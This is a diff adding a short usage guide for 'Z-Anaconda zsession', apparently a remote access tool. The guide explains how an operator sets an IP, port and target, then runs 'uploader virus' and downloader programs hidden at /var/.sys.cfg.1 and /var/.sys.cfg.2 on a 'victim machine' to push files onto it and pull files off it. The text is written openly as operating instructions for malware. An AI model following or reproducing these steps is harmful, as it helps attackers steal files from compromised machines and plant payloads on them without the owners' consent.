@@ -1,0 +1,25 @@
+the Z-Anaconda session for file upload & download
+
+usage: 
+    
+    set your ip and port, then your target and mode, then type zsession
+    
+    in the zsession terminal use this commands
+       
+        upload: will open a blue terminal waiting for a connection from the virus, 
+        download: Like upload
+
+     how to transfer files, first zsession will not work on ngrok or this service that give you dynamic public addresses
+                   upload: cd to your directory on the victim machine and type: /var/.sys.cfg.1 to run the uploader virus, then goto the upload session and type the
+                        filename followed by a space followed by the filename you want to upload as.
+
+                   download: To download a file, like upload but instead of executing /var/.sys.cfg.1 execute /var/.sys.cfg.2 in the 
+                        directory that contain file you want to download, followed by a space and the destination file on your system.
+exapmle:
+    
+     zsession 
+         
+          help (inside zsession)
+          download (inside zsession)
+          upload (inside zsession)
+          cd, pwd, ls (inside zsession)
